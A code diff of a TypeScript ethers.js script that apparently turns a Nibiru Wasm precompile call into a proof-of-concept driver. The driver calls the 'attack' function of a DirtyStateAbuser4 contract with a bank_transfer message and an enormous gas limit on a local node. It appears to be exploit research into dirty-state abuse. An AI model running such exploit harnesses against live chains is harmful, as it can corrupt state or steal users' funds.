@@ -1,8 +1,7 @@
 import { HDNodeWallet, JsonRpcProvider, toUtf8Bytes } from "ethers";
-import { IWasm__factory } from "../../typechain-types";
+import { DirtyStateAbuser4__factory } from "../../typechain-types";
 
 // connects to local node
-// const jsonRpcProvider = new JsonRpcProvider("https://evm-rpc.devnet-1.nibiru.fi:443");
 const jsonRpcProvider = new JsonRpcProvider("http://localhost:8545");
 
 // mnemonic for the HD wallet
@@ -11,10 +10,12 @@ const owner = HDNodeWallet.fromPhrase(mnemonic, "", "m/44'/118'/0'/0/0").connect
 
 // get command line arguments
 const COMMAND_LINE_ARGS = process.argv.slice(2)
-const CONTRACT_ADDR = COMMAND_LINE_ARGS[0]
+const attackContract = COMMAND_LINE_ARGS[0]
+const wasmContract = COMMAND_LINE_ARGS[1]
 
 async function main() {
-  const wasmPrecompile = IWasm__factory.connect("0x0000000000000000000000000000000000000802", owner);
+  const contract = DirtyStateAbuser4__factory.connect(attackContract, owner)
+  console.log("contract address: ", await contract.getAddress())
 
   const msgBz = toUtf8Bytes(JSON.stringify({
     "bank_transfer": {
@@ -22,15 +23,16 @@ async function main() {
     }
   }));
 
-  const txResponse = await wasmPrecompile.execute(CONTRACT_ADDR, msgBz, [{
-    denom: "unibi",
-    amount: 1_000_000,
-  }], {
-    gasLimit: 3_000_000,
-  });
+  const txResponse = await contract.attack(wasmContract, msgBz, {
+    gasLimit: 9_000_864_030_308,
+    gasPrice: 1,
+  })
   console.log("tx: ", txResponse)
   const txReceipt = await jsonRpcProvider.waitForTransaction(txResponse.hash)
   console.log("txReceipt: ", txReceipt)
+
+  const counter = await contract.getCounter();
+  console.log("Counter: ", counter.toString());
 }
 
 main()
